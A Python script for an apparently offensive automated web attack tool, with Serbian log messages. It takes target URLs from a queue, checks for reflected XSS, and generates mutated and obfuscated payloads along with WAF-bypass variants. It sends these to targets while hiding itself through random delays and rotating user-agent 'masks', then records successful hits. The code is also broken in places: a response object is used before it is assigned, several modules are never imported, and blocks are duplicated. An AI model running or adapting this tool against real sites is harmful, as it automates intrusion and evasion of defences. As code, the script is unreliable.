import sys, os
import requests
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "core")))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "modules")))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "utils")))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "scripts")))

from modules.mutation_engine import generate_mutations
from modules.alchemist_mutator import transmute_payloads
from core.live_hud import update_status
from core.agent_behavior import simulate_behavior
from core.agent_behavior import simulate_behavior
from shadow_strateg import suggest_profile_for_host, top_payloads_for_vector, payloads_to_avoid
from urllib.parse import urlparse
from xss_mutator import mutate_batch
from xss_reflection_detector import is_reflected_xss
from payload_library import load_payloads
from adaptive_profile_switcher import log_failure, should_switch, reset_failure
from attack_signature_tracker import record_signature
from urllib.parse import urlparse
from waf_bypass_lab import bypass_variants
from payload_evolution import evolve_batch
from payload_library import load_payloads
from headers_mission import build_mission_headers
from alert_trigger import trigger_alert
from ai_feedback_loop import suggest_payloads
from strateg_router import choose_vector
from mind_recorder import record_hit
from core_loader import get_attack_profile
from payload_store import get_payloads_by_vector
from payload_mutator import contextual_mutate
from obfuscator import obfuscate_payload
from live_logger import log_line
from pdf_report_maker import generate_pdf_report
from response_analyzer import analyze_response
from shadow_task_queue import get_next_task, save_queue
from modules.html_report import generate_html_report

def auto_attack(target_url, vector=None):
    update_status(meta=target_url, vector=vector, agent="Unknown", state="Initializing")
    if not vector:
        vector = choose_vector(target_url)
        host = urlparse(target_url).hostname
        profile_name = suggest_profile_for_host(host)
        profile = get_attack_profile(profile_name)

        log_line(f"[STRATEG] Predloženi profil za {host}: {profile_name}")
    log_line(f"[AUTO] Nova meta aktivna: {target_url} | Vektor: {vector}")

    if vector == "xss":
        if not is_reflected_xss(target_url):
            log_line("[XSS-DETECTOR] Refleksija NIJE pronađena — preskačem metu.")
            return
        else:
            log_line("[XSS-DETECTOR] Refleksija DETEKTOVANA — nastavljam.") 
    # adaptivni profil
    if should_switch(target_url):
        profile = get_attack_profile("GhostCrawl")
        log_line("[AUTO] Prebacivanje na GhostCrawl zbog neuspeha.")
    else:
        profile = get_attack_profile("DefaultHuman")

    if profile is None:
        log_line("[AUTO] Profil nije pronađen.")
        return
    update_status(agent=profile.get("name", "unknown"))
    base_payloads = get_payloads_by_vector(vector)
    ai_payloads = suggest_payloads(vector, count=2)
    for p in ai_payloads:
        base_payloads.append((-1, p))  # nije iz baze

    if not base_payloads:
        log_line(f"[AUTO] Nema payload-a u bazi — koristi biblioteku za '{vector}'")
        base_payloads = [(-1, p) for p in load_payloads(vector)]
    log_line(f"[AUTO] Meta: {target_url} | Vektor: {vector}")

    valid_hits = []

    for pid, code in base_payloads:
        mutated_base = contextual_mutate(code, vector)

        if vector == "xss":
            mutated_variants = transmute_payloads([mutated_base], count=3)
        else:
            mutated_variants = evolve_batch(mutated_base, count=3)
            for variant in mutated_variants:
                obfuscated_list = bypass_variants(variant)
                for payload in obfuscated_list:
                    try:
                        simulate_behavior(mode=profile.get("behavior", "default"))
                        if profile.get("behavior") == "observe":
                            log_line("[BEHAVIOR] Profil je u modu posmatranja — preskačem metu.")
                            return
                        full_url = target_url.replace("FUZZ", payload)
                        headers = build_mission_headers(profile["headers"], agent_name="Whitefox980")
                        # --- THIEF-MODE: ponašanje lopova ---
                        stealth_delay = random.uniform(1.2, 4.5)
                        log_line(f"[THIEF] Shadow stoji {stealth_delay:.2f}s, osluškuje metu...")
                        time.sleep(stealth_delay)
                        log_result = {
                            "url": full_url,
                            "vector": vector,
                            "payload": payload,
                            "status": r.status_code,
                            "size": len(r.content),
                            "response": r.text
                        }

                        with open("reports/replay.jsonl", "a", encoding="utf-8") as out:
                            out.write(json.dumps(log_result) + "\n")

                        if random.random() < 0.3:
                            headers = build_mission_headers(profile["headers"], agent_name="GhostFox" + str(random.randint(100,999)))
                        log_line("[THIEF] Menjam masku (headers/agent).")
                        r = requests.get(full_url, headers=headers, timeout=5)

                        score = analyze_response(r, payload)
                        log_line(f"[SCORE {score}] {payload}")
                        if score >= 50:
                            reset_failure(target_url)
                            record_signature(target_url, payload, profile.get("name", "unknown"))
                            valid_hits.append(payload)
                            record_hit(vector, payload)
                            trigger_alert(payload, score, target_url)
                            generate_html_report(
                                payload=payload,
                                target_url=target_url,
                                profile=profile.get("name", "unknown"),
                                vector=vector,
                                score=score
                            )
                            generate_report(
                                payload=payload,
                                target_url=target_url,
                                profile=profile.get("name", "unknown"),
                                vector=vector,
                                hits=1,
                                agent_name="ShadowFox-X"
                            )
                    except Exception as e:
                        log_line(f"[ERROR] {e}")

    if valid_hits:
        generate_pdf_report(target_url, valid_hits)
        log_line("[REPORT] PDF generisan.")
    else:
        log_failure(target_url)
        log_line("[INFO] Nema validnih pogodaka.")
    if valid_hits:
        generate_pdf_report(target_url, valid_hits)
        log_line("[REPORT] PDF generisan.")
    else:
        log_line("[INFO] Nema validnih pogodaka.")

if __name__ == "__main__":
    while True:
        task_data = get_next_task()
        if not task_data:
            print("[QUEUE] Nema više zadataka.")
            break
        task, queue = task_data
        url = task["url"]
        vector = task["vector"]
        auto_attack(url, vector)
        save_queue(queue)
